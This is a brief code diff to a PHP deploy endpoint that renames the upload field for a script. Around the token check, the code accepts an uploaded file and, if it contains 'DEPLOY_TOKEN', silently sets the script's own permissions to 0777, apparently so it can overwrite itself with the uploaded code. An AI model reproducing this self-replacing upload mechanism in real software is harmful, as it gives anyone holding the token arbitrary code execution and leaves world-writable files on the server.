@@ -36,9 +36,9 @@ if ($token !== DEPLOY_TOKEN) {
 }
 
 // Direct script update via POST file upload
-if (isset($_FILES['script'])) {
+if (isset($_FILES['deploy_script'])) {
     header('Content-Type: text/plain');
-    $code = file_get_contents($_FILES['script']['tmp_name']);
+    $code = file_get_contents($_FILES['deploy_script']['tmp_name']);
     $self = __FILE__;
     if ($code && strpos($code, 'DEPLOY_TOKEN') !== false) {
         @chmod($self, 0777);
